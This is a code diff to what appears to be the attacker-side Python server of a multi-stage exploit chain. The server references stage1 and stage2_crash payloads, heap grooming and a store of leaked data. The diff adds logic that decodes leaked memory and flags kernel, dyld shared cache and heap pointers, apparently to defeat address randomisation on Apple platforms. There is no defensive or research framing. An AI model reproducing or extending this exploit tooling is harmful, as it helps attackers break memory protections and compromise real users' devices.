@@ -1119,10 +1119,40 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             body = _read_post_body(ssl_sock, request)
             try:
                 data = json.loads(body)
+                hex_str = data.get('hex', '')
                 print(f"\n{'='*60}")
                 print(f"[LEAK] Session={data.get('session')} Slot={data.get('slot')}")
                 print(f"[LEAK] Offset={data.get('offset')} Corrupted={data.get('corrupted_count')}")
-                print(f"[LEAK] Hex: {data.get('hex', '')[:200]}")
+                print(f"[LEAK] Hex ({len(hex_str)//2} bytes): {hex_str[:200]}")
+
+                # Auto-analyze leaked bytes for pointers
+                if hex_str:
+                    try:
+                        raw = bytes.fromhex(hex_str)
+                        import struct as st
+                        ptrs = []
+                        for off in range(0, len(raw) - 7, 8):
+                            val = st.unpack_from('<Q', raw, off)[0]
+                            if val == 0:
+                                continue
+                            # kernel pointer
+                            if 0xFFFFFE0000000000 <= val <= 0xFFFFFF0000000000:
+                                ptrs.append((off, val, 'KERNEL'))
+                            # dyld shared cache
+                            elif 0x180000000 <= (val & 0x0000FFFFFFFFFFFF) <= 0x280000000:
+                                ptrs.append((off, val, 'dyld_cache'))
+                            # heap pointer
+                            elif 0x100000000 <= (val & 0x0000FFFFFFFFFFFF) <= 0x180000000:
+                                ptrs.append((off, val, 'heap'))
+                        if ptrs:
+                            print(f"[LEAK] *** POINTERS FOUND ({len(ptrs)}) ***")
+                            for off, val, kind in ptrs[:10]:
+                                print(f"[LEAK]   +0x{off:04x}: 0x{val:016x} ({kind})")
+                        else:
+                            print(f"[LEAK] No recognizable pointers in {len(raw)} bytes")
+                    except Exception as e:
+                        print(f"[LEAK] Analysis error: {e}")
+
                 print(f"{'='*60}\n")
                 with groom_lock:
                     leaked_data[data.get("session", "unknown")].append(data)
